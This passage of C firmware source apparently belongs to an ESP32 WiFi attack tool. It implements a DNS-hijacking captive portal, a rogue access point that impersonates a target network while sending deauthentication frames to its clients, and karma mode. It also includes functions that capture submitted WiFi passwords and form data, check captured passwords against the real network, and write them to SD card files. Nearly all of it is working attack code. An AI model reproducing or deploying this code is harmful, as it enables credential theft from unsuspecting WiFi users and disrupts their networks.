            pos += rx_buffer[pos] + 1;
        }
        pos++; // Skip final 0
        pos += 4; // Skip QTYPE and QCLASS
        question_len = pos - 12;
        
        if (question_len > 0 && question_len < (DNS_MAX_PACKET_SIZE - 12 - 16)) {
            memcpy(tx_buffer + 12, rx_buffer + 12, question_len);
            
            // Add answer section
            int answer_pos = 12 + question_len;
            
            // Name pointer to question (compression)
            tx_buffer[answer_pos++] = 0xC0;
            tx_buffer[answer_pos++] = 0x0C;
            
            // TYPE = A (0x0001)
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x01;
            
            // CLASS = IN (0x0001)
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x01;
            
            // TTL = 60 seconds
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x3C;
            
            // Data length = 4 bytes
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x04;
            
            // IP address: 172.0.0.1
            tx_buffer[answer_pos++] = 172;
            tx_buffer[answer_pos++] = 0;
            tx_buffer[answer_pos++] = 0;
            tx_buffer[answer_pos++] = 1;
            
            // Send response (silently)
            sendto(dns_server_socket, tx_buffer, answer_pos, 0,
                  (struct sockaddr *)&client_addr, client_addr_len);
        }
    }
    
    // Clean up
    close(dns_server_socket);
    dns_server_socket = -1;
    dns_server_task_handle = NULL;
    vTaskDelete(NULL);
}

esp_err_t wifi_attacks_start_portal(const char *ssid) {
    const char *portal_ssid = ssid ? ssid : "Free WiFi";
    ESP_LOGI(TAG, "Starting captive portal: %s", portal_ssid);
    
    // Store SSID for logging purposes
    strncpy(evilTwinSSID, portal_ssid, 32);
    evilTwinSSID[32] = '\0';
    
    // Enable Karma mode - no WiFi connection verification attempts
    karma_mode = true;
    
    // Get or create AP netif (like ensure_ap_mode in original)
    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (!ap_netif) {
        // AP netif doesn't exist - need to stop WiFi, create it, and restart
        ESP_LOGI(TAG, "Creating AP netif...");
        esp_wifi_stop();
        ap_netif = esp_netif_create_default_wifi_ap();
        if (!ap_netif) {
            ESP_LOGE(TAG, "Failed to create AP netif");
            esp_wifi_start();
            apply_wifi_power_settings();
            return ESP_FAIL;
        }
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        esp_wifi_start();
        apply_wifi_power_settings();
        vTaskDelay(pdMS_TO_TICKS(500));
    } else {
        // AP netif exists - ensure we're in APSTA mode
        wifi_mode_t mode;
        esp_wifi_get_mode(&mode);
        if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
            ESP_LOGI(TAG, "Switching WiFi to APSTA mode for Portal");
            esp_wifi_set_mode(WIFI_MODE_APSTA);
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    }
    
    // Stop DHCP server to configure custom IP
    esp_netif_dhcps_stop(ap_netif);
    
    // Set static IP 172.0.0.1 for AP
    esp_netif_ip_info_t ip_info;
    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
    
    esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set AP IP to 172.0.0.1: %s", esp_err_to_name(ret));
    }
    
    // Configure AP with portal SSID (no Zero Width Space - this is not Evil Twin)
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "",
            .ssid_len = 0,
            .channel = 1,
            .password = "",
            .max_connection = 4,
            .authmode = WIFI_AUTH_OPEN
        }
    };
    size_t ssid_len = strlen(portal_ssid);
    memcpy(ap_config.ap.ssid, portal_ssid, ssid_len);
    ap_config.ap.ssid_len = ssid_len;
    
    // Set AP config (mode is already APSTA from ensure or from Evil Twin's init)
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    
    // Start DHCP server
    ret = esp_netif_dhcps_start(ap_netif);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
    }
    
    vTaskDelay(pdMS_TO_TICKS(1000)); // Wait for AP to stabilize
    
    ESP_LOGI(TAG, "Portal AP active: %s", portal_ssid);
    stats_clients_connected = 0;
    
    // Register event handler for client connect/disconnect notifications
    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &portal_event_handler, NULL);
    
    // Start captive portal services (HTTP + DNS) - NO deauth!
    ESP_LOGI(TAG, "Captive portal started on 172.0.0.1");
    start_portal_services();
    
    // Emit portal deployed event
    emit_evil_twin_event(EVIL_TWIN_EVENT_PORTAL_DEPLOYED, evilTwinSSID, NULL);
    
    return ESP_OK;
}

esp_err_t wifi_attacks_start_rogue_ap(const char *ssid, const char *password,
                                     const uint8_t *target_bssid, uint8_t channel) {
    if (!ssid || !password) {
        ESP_LOGE(TAG, "Rogue AP requires both SSID and password");
        return ESP_ERR_INVALID_ARG;
    }
    
    ESP_LOGI(TAG, "Starting Rogue AP: %s (ch %d)", ssid, channel);
    
    strncpy(evilTwinSSID, ssid, 32);
    evilTwinSSID[32] = '\0';
    
    karma_mode = true;
    
    esp_wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(200));
    
    // Use APSTA mode so we can send raw deauth frames via WIFI_IF_AP
    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (!ap_netif) {
        ESP_LOGI(TAG, "Creating AP netif for Rogue AP...");
        esp_wifi_stop();
        ap_netif = esp_netif_create_default_wifi_ap();
        if (!ap_netif) {
            ESP_LOGE(TAG, "Failed to create AP netif");
            esp_wifi_start();
            apply_wifi_power_settings();
            return ESP_FAIL;
        }
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        esp_wifi_start();
        apply_wifi_power_settings();
        vTaskDelay(pdMS_TO_TICKS(500));
    } else {
        wifi_mode_t mode;
        esp_wifi_get_mode(&mode);
        if (mode != WIFI_MODE_APSTA) {
            esp_wifi_set_mode(WIFI_MODE_APSTA);
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    }
    
    esp_netif_dhcps_stop(ap_netif);
    
    esp_netif_ip_info_t ip_info;
    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
    
    esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set AP IP: %s", esp_err_to_name(ret));
    }
    
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "",
            .ssid_len = 0,
            .channel = channel > 0 ? channel : 1,
            .password = "",
            .max_connection = 4,
            .authmode = WIFI_AUTH_WPA2_PSK,
        }
    };
    size_t ssid_len = strlen(ssid);
    memcpy(ap_config.ap.ssid, ssid, ssid_len);
    ap_config.ap.ssid_len = ssid_len;
    strncpy((char *)ap_config.ap.password, password, sizeof(ap_config.ap.password) - 1);
    
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    
    ret = esp_netif_dhcps_start(ap_netif);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
    }
    
    vTaskDelay(pdMS_TO_TICKS(1000));
    
    ESP_LOGI(TAG, "Rogue AP active: %s (WPA2, ch %d)", ssid, channel);
    stats_clients_connected = 0;
    
    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &portal_event_handler, NULL);
    
    ESP_LOGI(TAG, "Rogue AP captive portal started on 172.0.0.1");
    start_portal_services();
    
    emit_evil_twin_event(EVIL_TWIN_EVENT_PORTAL_DEPLOYED, evilTwinSSID, NULL);
    
    // Start broadcast deauth to the target BSSID (same as Evil Twin)
    if (target_bssid) {
        wifi_scanner_save_target_bssids();
        wifi_attacks_start_deauth();
        emit_evil_twin_event(EVIL_TWIN_EVENT_DEAUTH_STARTED, evilTwinSSID, NULL);
        ESP_LOGI(TAG, "Rogue AP deauth started against %02X:%02X:%02X:%02X:%02X:%02X",
                 target_bssid[0], target_bssid[1], target_bssid[2],
                 target_bssid[3], target_bssid[4], target_bssid[5]);
    }
    
    return ESP_OK;
}

esp_err_t wifi_attacks_stop_portal(void) {
    // Only stop if portal is actually active
    if (!portal_active) {
        return ESP_OK;
    }
    
    ESP_LOGI(TAG, "Stopping captive portal...");
    
    // Stop deauth if running (Rogue AP starts deauth alongside portal)
    if (deauth_attack_active) {
        wifi_attacks_stop_deauth();
    }
    
    // Unregister portal event handler
    esp_event_handler_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, &portal_event_handler);
    
    // Reset Karma mode
    karma_mode = false;
    
    // Stop captive portal services (HTTP + DNS)
    stop_portal_services();
    
    // Restore WiFi to normal mode
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_start();
    apply_wifi_power_settings();

    ESP_LOGI(TAG, "Captive portal stopped");
    return ESP_OK;
}

bool wifi_attacks_is_portal_active(void) {
    return portal_active;
}

void wifi_attacks_set_karma_mode(bool enable) {
    karma_mode = enable;
    if (enable) {
        ESP_LOGI(TAG, "Karma mode enabled");
    } else {
        ESP_LOGI(TAG, "Karma mode disabled (Evil Twin mode)");
    }
}

// ============================================================================
// PASSWORD VERIFICATION AND DATA STORAGE
// ============================================================================

static void verify_password(const char* password) {
    // Save password to evilTwinPassword
    strncpy(evilTwinPassword, password, sizeof(evilTwinPassword) - 1);
    evilTwinPassword[sizeof(evilTwinPassword) - 1] = '\0';
    
    ESP_LOGI(TAG, "Verifying password...");
    
    // Set flag to prevent deauth from changing channels
    password_verification_in_progress = true;
    
    // Stop deauth attack BEFORE attempting to connect
    // This is crucial because deauth task switches channels which prevents stable STA connection
    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
        ESP_LOGI(TAG, "Stopping deauth attack to attempt connection...");
        deauth_attack_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && deauth_attack_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (deauth_attack_task_handle != NULL) {
            vTaskDelete(deauth_attack_task_handle);
            deauth_attack_task_handle = NULL;
            ESP_LOGI(TAG, "Deauth attack task forcefully stopped.");
        }
        
        ESP_LOGI(TAG, "Deauth attack stopped.");
    }
    
    // Set up STA config and try to connect to the network
    wifi_config_t sta_config = {0};
    strncpy((char *)sta_config.sta.ssid, evilTwinSSID, sizeof(sta_config.sta.ssid));
    sta_config.sta.ssid[sizeof(sta_config.sta.ssid) - 1] = '\0';
    strncpy((char *)sta_config.sta.password, password, sizeof(sta_config.sta.password));
    sta_config.sta.password[sizeof(sta_config.sta.password) - 1] = '\0';
    
    esp_wifi_set_config(WIFI_IF_STA, &sta_config);
    vTaskDelay(pdMS_TO_TICKS(500));
    
    ESP_LOGI(TAG, "Connecting to '%s'...", evilTwinSSID);
    connectAttemptCount = 0;
    esp_wifi_connect();
}

static void save_evil_twin_password(const char* ssid, const char* password) {
    // Check if /sdcard directory is accessible
    struct stat st;
    if (stat("/sdcard", &st) != 0) {
        ESP_LOGW(TAG, "Error: /sdcard directory not accessible");
        return;
    }
    
    // Create /sdcard/lab directory if it doesn't exist
    if (stat("/sdcard/lab", &st) != 0) {
        if (mkdir("/sdcard/lab", 0777) != 0) {
            ESP_LOGW(TAG, "Failed to create /sdcard/lab directory");
            return;
        }
    }
    
    // Try to open file for appending
    FILE *file = fopen("/sdcard/lab/eviltwin.txt", "a");
    if (file == NULL) {
        ESP_LOGW(TAG, "Failed to open eviltwin.txt for append, trying to create...");
        
        // Try to create the file first
        file = fopen("/sdcard/lab/eviltwin.txt", "w");
        if (file == NULL) {
            ESP_LOGE(TAG, "Failed to create eviltwin.txt");
            return;
        }
        // Close and reopen in append mode
        fclose(file);
        file = fopen("/sdcard/lab/eviltwin.txt", "a");
        if (file == NULL) {
            ESP_LOGE(TAG, "Failed to reopen eviltwin.txt");
            return;
        }
        ESP_LOGI(TAG, "Successfully created eviltwin.txt");
    }
    
    // Write SSID and password in CSV format
    fprintf(file, "\"%s\", \"%s\"\n", ssid, password);
    
    // Flush and close file to ensure data is written to disk
    fflush(file);
    fclose(file);
    
    // Also add to PSRAM cache for immediate UI visibility
    char cache_entry[256];
    snprintf(cache_entry, sizeof(cache_entry), "\"%s\", \"%s\"", ssid, password);
    sd_cache_add_eviltwin_entry(cache_entry);
    
    ESP_LOGI(TAG, "Password saved to eviltwin.txt and cache");
}

static void save_portal_data(const char* ssid, const char* form_data) {
    // Check if /sdcard directory is accessible
    struct stat st;
    if (stat("/sdcard", &st) != 0) {
        ESP_LOGW(TAG, "Error: /sdcard directory not accessible");
        return;
    }
    
    // Create /sdcard/lab directory if it doesn't exist
    if (stat("/sdcard/lab", &st) != 0) {
        if (mkdir("/sdcard/lab", 0777) != 0) {
            ESP_LOGW(TAG, "Failed to create /sdcard/lab directory");
            return;
        }
    }
    
    // Try to open file for appending
    FILE *file = fopen("/sdcard/lab/portals.txt", "a");
    if (file == NULL) {
        ESP_LOGW(TAG, "Failed to open portals.txt for append, trying to create...");
        
        // Try to create the file first
        file = fopen("/sdcard/lab/portals.txt", "w");
        if (file == NULL) {
            ESP_LOGE(TAG, "Failed to create portals.txt");
            return;
        }
        // Close and reopen in append mode
        fclose(file);
        file = fopen("/sdcard/lab/portals.txt", "a");
        if (file == NULL) {
            ESP_LOGE(TAG, "Failed to reopen portals.txt");
            return;
        }
        ESP_LOGI(TAG, "Successfully created portals.txt");
    }
    
    // Write SSID as first field
    fprintf(file, "\"%s\", ", ssid ? ssid : "Unknown");
    
    // Build cache entry in parallel
    char cache_entry[512];
    int cache_pos = snprintf(cache_entry, sizeof(cache_entry), "\"%s\", ", ssid ? ssid : "Unknown");
    
    // Parse form data and extract all fields
    // Form data is in format: field1=value1&field2=value2&...
    char *data_copy = strdup(form_data);
    if (data_copy == NULL) {
        fclose(file);
        return;
    }
    
    // Split by '&' and process each field
    char *saveptr = NULL;
    char *field = strtok_r(data_copy, "&", &saveptr);
    bool first_field = true;
    
    while (field != NULL) {
        // Split field by '='
        char *eq = strchr(field, '=');
        if (eq) {
            *eq = '\0';
            char *value = eq + 1;
            
            // URL decode value
            char decoded_value[128];
            url_decode(value, decoded_value, sizeof(decoded_value));
            
            // Write to file
            if (!first_field) {
                fprintf(file, ", ");
                if (cache_pos < (int)sizeof(cache_entry) - 2) {
                    cache_pos += snprintf(cache_entry + cache_pos, sizeof(cache_entry) - cache_pos, ", ");
                }
            }
            fprintf(file, "\"%s\"", decoded_value);
            if (cache_pos < (int)sizeof(cache_entry) - 1) {
                cache_pos += snprintf(cache_entry + cache_pos, sizeof(cache_entry) - cache_pos, "\"%s\"", decoded_value);
            }
            first_field = false;
        }
        
        field = strtok_r(NULL, "&", &saveptr);
    }
    
    fprintf(file, "\n");
    free(data_copy);
    
    // Flush and close file
    fflush(file);
    fclose(file);
    
    // Add to PSRAM cache for immediate UI visibility
    sd_cache_add_portal_entry(cache_entry);
    
    ESP_LOGI(TAG, "Portal data saved to portals.txt and cache");
}

// Queue karma data for deferred save (called from HTTP handler - can't access SD directly due to SPI conflicts)
static void save_karma_data(const char* ssid, const char* form_data) {
    // Build log message for UI display
    char log_msg[512];
    int log_pos = 0;
    log_pos += snprintf(log_msg + log_pos, sizeof(log_msg) - log_pos, 
                       "[Karma] Data captured from '%s': ", ssid ? ssid : "Unknown");
    
    // Parse and display form data
    char *data_copy = strdup(form_data);
    if (data_copy) {
        char *saveptr = NULL;
        char *field = strtok_r(data_copy, "&", &saveptr);
        bool first_field = true;
        
        while (field != NULL) {
            char *eq = strchr(field, '=');
            if (eq) {
                *eq = '\0';
                char *field_name = field;
                char *value = eq + 1;
                
                char decoded_value[128];
                url_decode(value, decoded_value, sizeof(decoded_value));
                
                if (!first_field && log_pos < (int)sizeof(log_msg) - 3) {
                    log_msg[log_pos++] = ',';
                    log_msg[log_pos++] = ' ';
                }
                if (log_pos < (int)sizeof(log_msg) - 1) {
                    int written = snprintf(log_msg + log_pos, sizeof(log_msg) - log_pos,
                                          "%s=%s", field_name, decoded_value);
                    if (written > 0 && log_pos + written < (int)sizeof(log_msg)) {
                        log_pos += written;
                    }
                }
                first_field = false;
            }
            field = strtok_r(NULL, "&", &saveptr);
        }
        free(data_copy);
    }
    
    // Log the captured data
    ESP_LOGI(TAG, "%s", log_msg);
    
    // Emit event FIRST so UI shows the data immediately
    emit_evil_twin_event(EVIL_TWIN_EVENT_PASSWORD_PROVIDED, evilTwinSSID, log_msg);
    
    // Queue data for deferred save (main loop will process this to avoid SPI conflicts)
    if (!pending_karma_save.pending) {
        strncpy(pending_karma_save.ssid, ssid ? ssid : "Unknown", sizeof(pending_karma_save.ssid) - 1);
        pending_karma_save.ssid[sizeof(pending_karma_save.ssid) - 1] = '\0';
        strncpy(pending_karma_save.form_data, form_data, sizeof(pending_karma_save.form_data) - 1);
        pending_karma_save.form_data[sizeof(pending_karma_save.form_data) - 1] = '\0';
        pending_karma_save.pending = true;
        ESP_LOGI(TAG, "Karma data queued for save");
    } else {
        ESP_LOGW(TAG, "Previous karma data still pending, new data not queued");
    }
}

// Process pending karma saves - call this from main loop (safe SPI context)
void wifi_attacks_process_pending_saves(void) {
    if (!pending_karma_save.pending) {
        return;
    }
    
    // Check if /sdcard directory is accessible
    struct stat st;
    if (stat("/sdcard", &st) != 0) {
        ESP_LOGW(TAG, "Error: /sdcard directory not accessible");
        pending_karma_save.pending = false;
        return;
    }
    
    // Create /sdcard/lab directory if it doesn't exist
    if (stat("/sdcard/lab", &st) != 0) {
        if (mkdir("/sdcard/lab", 0777) != 0) {
            ESP_LOGW(TAG, "Failed to create /sdcard/lab directory");
            pending_karma_save.pending = false;
            return;
        }
    }
    
    // Try to open file for appending
    FILE *file = fopen("/sdcard/lab/eviltwin.txt", "a");
    if (file == NULL) {
        file = fopen("/sdcard/lab/eviltwin.txt", "w");
        if (file == NULL) {
            ESP_LOGE(TAG, "Failed to create eviltwin.txt");
            pending_karma_save.pending = false;
            return;
        }
        fclose(file);
        file = fopen("/sdcard/lab/eviltwin.txt", "a");
        if (file == NULL) {
            ESP_LOGE(TAG, "Failed to reopen eviltwin.txt");
            pending_karma_save.pending = false;
            return;
        }
    }
    
    // Write SSID as first field
    fprintf(file, "\"%s\", ", pending_karma_save.ssid);
    
    // Build cache entry in parallel
    char cache_entry[512];
    int cache_pos = snprintf(cache_entry, sizeof(cache_entry), "\"%s\", ", pending_karma_save.ssid);
    
    // Parse form data and extract all fields
    char *data_copy = strdup(pending_karma_save.form_data);
    if (data_copy) {
        char *saveptr = NULL;
        char *field = strtok_r(data_copy, "&", &saveptr);
        bool first_field = true;
        
        while (field != NULL) {
            char *eq = strchr(field, '=');
            if (eq) {
                *eq = '\0';
                char *value = eq + 1;
                
                char decoded_value[128];
                url_decode(value, decoded_value, sizeof(decoded_value));
                
                if (!first_field) {
                    fprintf(file, ", ");
                    if (cache_pos < (int)sizeof(cache_entry) - 2) {
                        cache_pos += snprintf(cache_entry + cache_pos, sizeof(cache_entry) - cache_pos, ", ");
                    }
                }
                fprintf(file, "\"%s\"", decoded_value);
                if (cache_pos < (int)sizeof(cache_entry) - 1) {
                    cache_pos += snprintf(cache_entry + cache_pos, sizeof(cache_entry) - cache_pos, "\"%s\"", decoded_value);
                }
                first_field = false;
            }
            field = strtok_r(NULL, "&", &saveptr);
        }
        free(data_copy);
    }
    
    fprintf(file, "\n");
    fflush(file);
    fclose(file);
    
    // Add to PSRAM cache for immediate UI visibility
    sd_cache_add_eviltwin_entry(cache_entry);
    
    ESP_LOGI(TAG, "Karma data saved to eviltwin.txt and cache");
    pending_karma_save.pending = false;
}

// ============================================================================
// COMMON FUNCTIONS
// ============================================================================

esp_err_t wifi_attacks_stop_all(void) {
    ESP_LOGI(TAG, "Stopping all attacks...");
    
    wifi_attacks_stop_deauth();
    wifi_attacks_stop_blackout();
    wifi_attacks_stop_sae_overflow();
    wifi_attacks_stop_karma();
    wifi_attacks_stop_portal();
    
    return ESP_OK;
}

void wifi_attacks_list_sd_html(void) {
    ESP_LOGI(TAG, "SD HTML files: %d", sd_html_count);
    for (int i = 0; i < sd_html_count; i++) {
        ESP_LOGI("attacks", "%d: %s", i, sd_html_files[i]);
    }
}

int wifi_attacks_get_sd_html_count(void)
{
    return sd_html_count;
}

const char *wifi_attacks_get_sd_html_name(int index)
{
    if (index < 0 || index >= sd_html_count) {
        return NULL;
    }
    return sd_html_files[index];
}

esp_err_t wifi_attacks_select_sd_html(int index) {
    if (index < 0 || index >= sd_html_count) {
        ESP_LOGE(TAG, "Invalid HTML file index");
        return ESP_ERR_INVALID_ARG;
    }
    
    // Ensure portal HTML buffer is allocated
    if (custom_portal_html == NULL) {
        esp_err_t ret = wifi_attacks_init_portal_html_buffer();
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "Failed to allocate portal HTML buffer");
            return ret;
        }
    }
    
    char filepath[256];
    snprintf(filepath, sizeof(filepath), "%s/%s", PORTAL_HTML_DIR, sd_html_files[index]);
    
    // Open file and get size
    FILE *f = fopen(filepath, "r");
    if (f == NULL) {
        ESP_LOGE(TAG, "Failed to open file: %s", filepath);
        return ESP_FAIL;
    }
    
    // Get file size
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    // Validate size - limit to custom_portal_html buffer size minus 1 for null terminator
    if (fsize <= 0 || fsize >= (long)custom_portal_html_size) {
        ESP_LOGE(TAG, "File size invalid or too large: %ld bytes (max %lu)", fsize, (unsigned long)(custom_portal_html_size - 1));
        fclose(f);
        return ESP_FAIL;
    }
    
    // Read file into custom_portal_html buffer (allocated in PSRAM)
    size_t bytes_read = fread(custom_portal_html, 1, fsize, f);
    custom_portal_html[bytes_read] = '\0';
    fclose(f);
    
    ESP_LOGI(TAG, "Loaded HTML file: %s (%u bytes) into PSRAM buffer", sd_html_files[index], (unsigned int)bytes_read);
    ESP_LOGI(TAG, "Portal will now use this custom HTML.");
    
    return ESP_OK;
}

uint32_t wifi_attacks_get_deauth_count(void) {
    return stats_deauth_sent;
}

uint32_t wifi_attacks_get_beacon_count(void) {
    return stats_beacon_sent;
}

uint32_t wifi_attacks_get_clients_connected(void) {
    return stats_clients_connected;
}
